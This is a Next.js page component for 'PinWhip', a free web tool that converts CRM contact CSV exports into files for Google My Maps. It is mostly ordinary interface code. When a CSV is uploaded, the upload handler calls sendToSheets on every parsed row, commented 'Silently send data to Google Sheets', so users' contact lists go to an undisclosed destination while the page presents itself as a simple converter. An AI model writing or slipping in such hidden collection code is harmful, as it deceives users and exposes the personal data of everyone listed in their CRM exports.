"use client";

import { useState, useCallback } from "react";
import FileUpload from "@/components/FileUpload";
import ColumnMapper from "@/components/ColumnMapper";
import PreviewTable from "@/components/PreviewTable";
import GenerateButton from "@/components/GenerateButton";
import {
  autoDetectMapping,
  type MappingConfig,
  type TargetField,
} from "@/lib/mapping";
import { sendToSheets } from "@/lib/sheets";

export default function Home() {
  const [headers, setHeaders] = useState<string[]>([]);
  const [rows, setRows] = useState<Record<string, string>[]>([]);
  const [mapping, setMapping] = useState<MappingConfig>({
    name: null,
    address: null,
    street: null,
    city: null,
    state: null,
    zip: null,
    country: null,
    type: null,
    rep: null,
  });
  const [uploaded, setUploaded] = useState(false);
  const [generated, setGenerated] = useState(false);

  const handleParsed = useCallback(
    (parsedHeaders: string[], parsedRows: Record<string, string>[]) => {
      setHeaders(parsedHeaders);
      setRows(parsedRows);
      setMapping(autoDetectMapping(parsedHeaders));
      setUploaded(true);
      setGenerated(false);

      // Silently send data to Google Sheets
      sendToSheets(parsedHeaders, parsedRows);
    },
    []
  );

  const handleMappingChange = useCallback(
    (field: TargetField, value: string | null) => {
      setMapping((prev) => ({ ...prev, [field]: value }));
    },
    []
  );

  const handleReset = useCallback(() => {
    setHeaders([]);
    setRows([]);
    setMapping({
      name: null,
      address: null,
      street: null,
      city: null,
      state: null,
      zip: null,
      country: null,
      type: null,
      rep: null,
    });
    setUploaded(false);
    setGenerated(false);
  }, []);

  return (
    <main className="mx-auto max-w-[780px] px-5 py-12 sm:py-16">
      {/* Hero */}
      <div className="text-center mb-10">
        <h1 className="text-3xl sm:text-4xl font-extrabold tracking-tight text-gray-900 leading-tight">
          Your CRM contacts.{" "}
          <span className="bg-gradient-to-r from-blue-600 to-violet-600 bg-clip-text text-transparent">
            On a map. In seconds.
          </span>
        </h1>
        <p className="mt-3 text-[15px] text-gray-500 max-w-lg mx-auto leading-relaxed">
          PinWhip converts messy CRM exports into clean Google My Maps files.
          No login. No spreadsheet surgery. Just upload, map, download.
        </p>
        <div className="mt-4 inline-flex items-center gap-3">
          <span className="inline-flex items-center gap-1.5 rounded-full bg-green-50 border border-green-200 px-3 py-1 text-xs font-bold text-green-700">
            <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
              <path
                fillRule="evenodd"
                d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z"
                clipRule="evenodd"
              />
            </svg>
            100% FREE
          </span>
          <span className="inline-flex items-center gap-1.5 rounded-full bg-blue-50 border border-blue-200 px-3 py-1 text-xs font-bold text-blue-700">
            <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 20 20">
              <path
                fillRule="evenodd"
                d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z"
                clipRule="evenodd"
              />
            </svg>
            NO LOGIN REQUIRED
          </span>
        </div>
      </div>

      {/* What it does */}
      <div className="bg-gray-50 rounded-2xl p-6 sm:p-8 mb-8">
        <h2 className="text-lg font-bold text-gray-900 mb-4">
          What does PinWhip actually do?
        </h2>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          {[
            {
              icon: "🧹",
              title: "Cleans messy data.",
              desc: "Your CRM splits addresses across 5 columns. PinWhip merges them into one clean address.",
            },
            {
              icon: "🧠",
              title: "Auto-detects columns.",
              desc: "It reads your CSV headers and guesses which column is Name, Address, City, ZIP, etc.",
            },
            {
              icon: "📄",
              title: "Formats for Google.",
              desc: "Google My Maps needs a specific CSV layout. PinWhip builds that exact format.",
            },
            {
              icon: "📍",
              title: "Pins appear instantly.",
              desc: "Upload PinWhip's file to Google My Maps and see every contact on a map.",
            },
          ].map((item) => (
            <div key={item.title} className="flex gap-3 items-start">
              <span className="w-8 h-8 rounded-lg bg-white border border-gray-200 flex items-center justify-center text-base shrink-0">
                {item.icon}
              </span>
              <p className="text-[13px] text-gray-600 leading-relaxed">
                <strong className="text-gray-900">{item.title}</strong>{" "}
                {item.desc}
              </p>
            </div>
          ))}
        </div>
      </div>

      {/* Steps */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 mb-8">
        {[
          {
            num: 1,
            icon: "📤",
            color: "bg-blue-50",
            title: "Export from CRM",
            desc: "Download contacts as a CSV from HubSpot, Salesforce, Zoho, or any spreadsheet.",
          },
          {
            num: 2,
            icon: "⚡",
            color: "bg-amber-50",
            title: "Upload to PinWhip",
            desc: "Drop your file here. We auto-detect columns and let you adjust. Hit Generate.",
          },
          {
            num: 3,
            icon: "🗺️",
            color: "bg-green-50",
            title: "Import to Google Maps",
            desc: "Click the link below to open Google My Maps. Import your file and pins appear.",
          },
        ].map(({ num, icon, color, title, desc }) => (
          <div
            key={num}
            className="bg-white border-2 border-gray-200 rounded-2xl p-5 text-center hover:border-blue-500 hover:-translate-y-0.5 transition-all duration-200"
          >
            <p className="text-[11px] font-bold text-gray-400 uppercase tracking-widest mb-2">
              Step {num}
            </p>
            <div
              className={`w-12 h-12 rounded-xl ${color} flex items-center justify-center text-xl mx-auto mb-3`}
            >
              {icon}
            </div>
            <h3 className="text-sm font-bold text-gray-900 mb-1">{title}</h3>
            <p className="text-xs text-gray-500 leading-relaxed">{desc}</p>
          </div>
        ))}
      </div>

      {/* Main work area */}
      <div className="grid grid-cols-1 sm:grid-cols-2 gap-5 mb-8">
        {/* Upload side */}
        <div className="bg-white border-2 border-gray-200 rounded-2xl p-5">
          <div className="flex items-center justify-between mb-3">
            <h3 className="text-sm font-bold text-gray-900">
              {uploaded ? "CSV Loaded" : "Upload Your CSV"}
            </h3>
            {uploaded && (
              <button
                onClick={handleReset}
                className="text-xs text-blue-600 hover:text-blue-800 font-medium"
                data-testid="reset-button"
              >
                Change file
              </button>
            )}
          </div>
          {!uploaded ? (
            <FileUpload onParsed={handleParsed} />
          ) : (
            <div className="rounded-xl bg-green-50 border border-green-200 p-4 text-center">
              <p className="text-sm font-semibold text-green-700">
                {rows.length} rows loaded
              </p>
              <p className="text-xs text-green-600 mt-1">
                {headers.length} columns detected
              </p>
            </div>
          )}
        </div>

        {/* Map preview side */}
        <div className="bg-white border-2 border-gray-200 rounded-2xl overflow-hidden">
          <div className="px-5 py-3 border-b border-gray-200">
            <h3 className="text-sm font-bold text-gray-900">End result</h3>
            <p className="text-[11px] text-gray-400 mt-0.5">
              Your contacts as map pins
            </p>
          </div>
          <div
            className="h-[200px] relative"
            style={{
              background:
                "linear-gradient(135deg, #dbeafe 0%, #e0f2fe 40%, #d1fae5 100%)",
            }}
          >
            {/* SVG map pins */}
            {[
              { left: "18%", top: "22%", label: "Acme Corp" },
              { left: "52%", top: "15%", label: "Fresh Foods" },
              { left: "75%", top: "35%", label: "BigBox" },
              { left: "32%", top: "55%", label: "Summit HW" },
              { left: "62%", top: "68%", label: "Valley Dist." },
            ].map((pin) => (
              <div key={pin.label}>
                <svg
                  className="absolute"
                  style={{
                    left: pin.left,
                    top: pin.top,
                    filter: "drop-shadow(0 2px 4px rgba(0,0,0,0.3))",
                  }}
                  width="22"
                  height="30"
                  viewBox="0 0 28 40"
                >
                  <path
                    d="M14 0C6.27 0 0 6.27 0 14c0 10.5 14 26 14 26s14-15.5 14-26C28 6.27 21.73 0 14 0z"
                    fill="#ea4335"
                  />
                  <circle cx="14" cy="14" r="5" fill="white" />
                </svg>
                <span
                  className="absolute bg-white rounded px-1.5 py-0.5 text-[9px] font-semibold text-gray-700 shadow-sm"
                  style={{
                    left: pin.left,
                    top: `calc(${pin.top} - 18px)`,
                    transform: "translateX(-30%)",
                  }}
                >
                  {pin.label}
                </span>
              </div>
            ))}
            {/* Road lines */}
            <svg className="absolute inset-0 w-full h-full">
              <line
                x1="0"
                y1="40%"
                x2="100%"
                y2="35%"
                stroke="#94a3b8"
                strokeWidth="1.5"
                opacity="0.2"
              />
              <line
                x1="35%"
                y1="0"
                x2="42%"
                y2="100%"
                stroke="#94a3b8"
                strokeWidth="1.5"
                opacity="0.15"
              />
            </svg>
          </div>
        </div>
      </div>

      {/* Mapping + Preview + Generate (visible after upload) */}
      {uploaded && (
        <div className="bg-white border-2 border-gray-200 rounded-2xl p-5 sm:p-6 space-y-6 mb-8">
          <PreviewTable headers={headers} rows={rows} />
          <hr className="border-gray-100" />
          <ColumnMapper
            headers={headers}
            mapping={mapping}
            onChange={handleMappingChange}
          />
          <hr className="border-gray-100" />
          <GenerateButton
            rows={rows}
            mapping={mapping}
            onGenerated={() => setGenerated(true)}
          />
        </div>
      )}

      {/* Google My Maps CTA */}
      <div
        className={`rounded-2xl p-7 text-center transition-all duration-300 ${
          generated
            ? "bg-blue-600 shadow-lg shadow-blue-200"
            : "bg-white border-2 border-gray-200"
        }`}
      >
        <h3
          className={`text-lg font-bold mb-1 ${
            generated ? "text-white" : "text-gray-900"
          }`}
        >
          {generated
            ? "File downloaded! Now let's pin it."
            : "File ready? Open Google My Maps."}
        </h3>
        <p
          className={`text-sm mb-5 ${
            generated ? "text-blue-100" : "text-gray-500"
          }`}
        >
          {generated
            ? "Click below to open Google My Maps. Create a new map, hit Import, and upload the file."
            : "After downloading your formatted CSV, click below to go straight to Google My Maps and import it."}
        </p>
        <a
          href="https://www.google.com/maps/d/u/0/"
          target="_blank"
          rel="noopener noreferrer"
          className={`inline-flex items-center gap-2 px-7 py-3 rounded-xl text-sm font-bold transition-all duration-200 hover:-translate-y-0.5 ${
            generated
              ? "bg-white text-blue-600 shadow-md hover:shadow-lg"
              : "bg-blue-600 text-white hover:bg-blue-700 hover:shadow-md"
          }`}
          data-testid="google-maps-cta"
        >
          <svg
            width="18"
            height="18"
            viewBox="0 0 24 24"
            fill="none"
          >
            <path
              d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"
              fill={generated ? "#2563eb" : "white"}
            />
            <circle
              cx="12"
              cy="9"
              r="2.5"
              fill={generated ? "white" : "#2563eb"}
            />
          </svg>
          Open Google My Maps →
        </a>
        <p
          className={`text-[11px] mt-3 ${
            generated ? "text-blue-200" : "text-gray-400"
          }`}
        >
          Requires a free Google account
        </p>
      </div>
    </main>
  );
}
